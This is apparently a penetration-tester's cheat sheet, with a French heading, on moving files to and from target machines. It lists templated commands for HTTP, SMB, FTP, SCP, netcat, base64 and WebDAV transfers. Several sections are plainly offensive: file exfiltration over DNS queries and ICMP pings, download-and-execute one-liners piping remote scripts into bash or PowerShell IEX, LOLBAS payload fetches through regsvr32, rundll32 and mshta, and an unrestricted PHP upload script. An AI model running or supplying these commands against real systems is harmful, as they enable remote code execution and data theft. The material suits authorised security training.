# Transfert de fichier

## HTTP Server

```bash
# Python
python3 -m http.server {{port}}
python2 -m SimpleHTTPServer {{port}}

# PHP
php -S 0.0.0.0:{{port}}

# Ruby
ruby -run -ehttpd . -p{{port}}

# Busybox
busybox httpd -f -p {{port}}

# Updog (upload)
updog -p {{port}}
```

## Download - Linux

```bash
# Wget
wget http://{{lhost}}:{{port}}/{{file}}
wget http://{{lhost}}:{{port}}/{{file}} -O {{output}}

# Curl
curl http://{{lhost}}:{{port}}/{{file}} -o {{output}}
curl http://{{lhost}}:{{port}}/{{file}} --output {{output}}

# Netcat
nc {{lhost}} {{port}} < {{file}}                # Sender
nc -lvnp {{port}} > {{file}}                    # Receiver

# Bash
exec 3<>/dev/tcp/{{lhost}}/{{port}}
cat <&3 > {{file}}

# PHP
php -r "file_put_contents('{{file}}', file_get_contents('http://{{lhost}}:{{port}}/{{file}}'));"
```

## Download - Windows

```powershell
# PowerShell
powershell -c "(New-Object Net.WebClient).DownloadFile('http://{{lhost}}:{{port}}/{{file}}','{{output}}')"
powershell -c "IWR -Uri http://{{lhost}}:{{port}}/{{file}} -OutFile {{output}}"
powershell -c "Invoke-WebRequest http://{{lhost}}:{{port}}/{{file}} -OutFile {{output}}"
powershell -c "wget http://{{lhost}}:{{port}}/{{file}} -OutFile {{output}}"

# Certutil
certutil -urlcache -f http://{{lhost}}:{{port}}/{{file}} {{output}}

# BitsAdmin
bitsadmin /transfer myDownload http://{{lhost}}:{{port}}/{{file}} C:\Users\{{user}}\{{output}}

# VBScript
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET", strURL, False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs
cscript wget.vbs http://{{lhost}}:{{port}}/{{file}} {{output}}
```

## SMB Server

```bash
# Setup SMB server (Linux)
impacket-smbserver share . -smb2support
impacket-smbserver share . -smb2support -username {{user}} -password {{pass}}

# Download from SMB (Windows)
copy \\{{lhost}}\share\{{file}} {{output}}
xcopy \\{{lhost}}\share\{{file}} {{output}}
robocopy \\{{lhost}}\share\ . {{file}}

# Mount SMB share (Windows)
net use Z: \\{{lhost}}\share
net use Z: \\{{lhost}}\share /user:{{user}} {{pass}}

# Mount SMB share (Linux)
mount -t cifs //{{machine_ip}}/share /mnt -o username={{user}},password={{pass}}
smbclient //{{machine_ip}}/share -U {{user}}
```

## FTP Server

```bash
# Python FTP server
python3 -m pyftpdlib -p {{port}} -w

# Setup FTP server
service pure-ftpd start

# Anonymous FTP
ftp {{lhost}}
# user: anonymous
# pass: anonymous

# Download file
get {{file}}
mget *.txt

# Upload file
put {{file}}
mput *.txt
```

## SCP

```bash
# Upload to remote
scp {{file}} {{user}}@{{machine_ip}}:/tmp/
scp -P {{port}} {{file}} {{user}}@{{machine_ip}}:/tmp/

# Download from remote
scp {{user}}@{{machine_ip}}:/tmp/{{file}} .
scp -P {{port}} {{user}}@{{machine_ip}}:/tmp/{{file}} .

# Recursive
scp -r {{directory}} {{user}}@{{machine_ip}}:/tmp/
```

## Netcat File Transfer

```bash
# Sender
nc -lvnp {{port}} < {{file}}
cat {{file}} | nc -lvnp {{port}}

# Receiver
nc {{lhost}} {{port}} > {{file}}

# With progress
nc -lvnp {{port}} < {{file}} | pv -b
nc {{lhost}} {{port}} | pv -b > {{file}}
```

## Base64 Transfer

```bash
# Encode (sender)
base64 {{file}} -w 0

# Decode (receiver - Linux)
echo "{{base64_content}}" | base64 -d > {{file}}

# Decode (receiver - Windows)
powershell -c "[System.Convert]::FromBase64String('{{base64_content}}') | Set-Content -Path {{file}} -Encoding Byte"
```

## PHP Upload

```php
<?php
if(isset($_FILES['file'])){
    move_uploaded_file($_FILES['file']['tmp_name'], $_FILES['file']['name']);
    echo "File uploaded successfully!";
}
?>
<form method="post" enctype="multipart/form-data">
    <input type="file" name="file">
    <input type="submit" value="Upload">
</form>
```

```bash
# Upload file
curl -F "file=@{{file}}" http://{{machine_ip}}/upload.php
```

## SSH/SFTP

```bash
# SFTP
sftp {{user}}@{{machine_ip}}
put {{file}}
get {{file}}

# SSH with tar
tar czf - {{directory}} | ssh {{user}}@{{machine_ip}} "tar xzf - -C /tmp"

# SSH with dd
dd if={{file}} | ssh {{user}}@{{machine_ip}} "dd of={{output}}"
```

## WebDAV

```bash
# Setup WebDAV
mkdir /tmp/webdav
wsgidav --host=0.0.0.0 --port={{port}} --root=/tmp/webdav

# Upload with curl
curl -T {{file}} http://{{lhost}}:{{port}}/

# Mount WebDAV (Windows)
net use Z: http://{{lhost}}:{{port}}

# cadaver
cadaver http://{{lhost}}:{{port}}
put {{file}}
```

## PowerShell Upload

```powershell
# Upload to server
powershell -c "(New-Object Net.WebClient).UploadFile('http://{{lhost}}:{{port}}/upload', '{{file}}')"

# Upload with Invoke-RestMethod
powershell -c "Invoke-RestMethod -Uri http://{{lhost}}:{{port}}/upload -Method Post -InFile {{file}}"
```

## Exfiltration via DNS

```bash
# Sender
for b in $(xxd -p {{file}}); do dig @{{dns_server}} $b.{{domain}}; done

# Receiver (capture DNS queries)
tcpdump -i eth0 -n udp port 53
```

## Exfiltration via ICMP

```bash
# Sender
xxd -p {{file}} | while read line; do ping -c 1 -p $line {{lhost}}; done

# Receiver
tcpdump -i eth0 icmp -X
```

## Download and Execute

```bash
# Linux
curl http://{{lhost}}:{{port}}/{{file}} | bash
wget -O - http://{{lhost}}:{{port}}/{{file}} | bash
curl http://{{lhost}}:{{port}}/{{file}} | sh

# Windows
powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://{{lhost}}:{{port}}/{{file}}')"
powershell -c "IEX(IWR http://{{lhost}}:{{port}}/{{file}} -UseBasicParsing)"
```

## Living Off The Land

```bash
# Windows LOLBAS
# Regsvr32
regsvr32 /s /n /u /i:http://{{lhost}}:{{port}}/{{file}} scrobj.dll

# Rundll32
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WinHttp.WinHttpRequest.5.1");h.Open("GET","http://{{lhost}}:{{port}}/{{file}}",false);h.Send();eval(h.ResponseText);

# Mshta
mshta http://{{lhost}}:{{port}}/{{file}}

# Bitsadmin
bitsadmin /transfer mydownload http://{{lhost}}:{{port}}/{{file}} C:\temp\{{output}}
```

## RDP File Transfer

```bash
# Mount local drive
rdesktop {{machine_ip}} -u {{user}} -p {{pass}} -r disk:share=/home/attacker/

# Copy file (from RDP session)
copy \\tsclient\share\{{file}} C:\temp\
```

## Archive & Compress

```bash
# Tar compress
tar czf {{archive}}.tar.gz {{directory}}
tar cjf {{archive}}.tar.bz2 {{directory}}

# Zip
zip -r {{archive}}.zip {{directory}}

# Untar
tar xzf {{archive}}.tar.gz
tar xjf {{archive}}.tar.bz2

# Unzip
unzip {{archive}}.zip

# 7z
7z a {{archive}}.7z {{directory}}
7z x {{archive}}.7z
```